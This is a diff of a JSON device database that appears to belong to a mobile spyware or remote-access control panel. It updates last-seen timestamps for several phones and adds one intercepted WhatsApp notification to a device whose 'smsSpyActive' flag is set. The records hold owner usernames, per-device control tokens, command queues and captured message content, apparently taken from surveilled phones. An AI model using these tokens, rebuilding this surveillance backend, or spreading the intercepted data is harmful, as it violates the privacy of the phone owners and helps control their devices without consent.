@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777349336809,
+    "lastSeen": 1777349348609,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -450,7 +450,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777349335701,
+    "lastSeen": 1777349347727,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -4483,7 +4483,7 @@
     "deviceName": "HP-KONTOL-A754",
     "ownerUsername": "Ubill_raa",
     "token": "bfb9af2cf50b25656e3283905dce6368",
-    "lastSeen": 1777349337675,
+    "lastSeen": 1777349349587,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-28T04:01:30.004Z",
@@ -4499,6 +4499,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "🇮🇩Information cyphxsec ID🇮🇩",
+        "content": "‎7 pesan baru",
+        "time": "28/04 11:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777349337744
+      },
       {
         "appName": "WhatsApp",
         "sender": "🇮🇩Information cyphxsec ID🇮🇩",
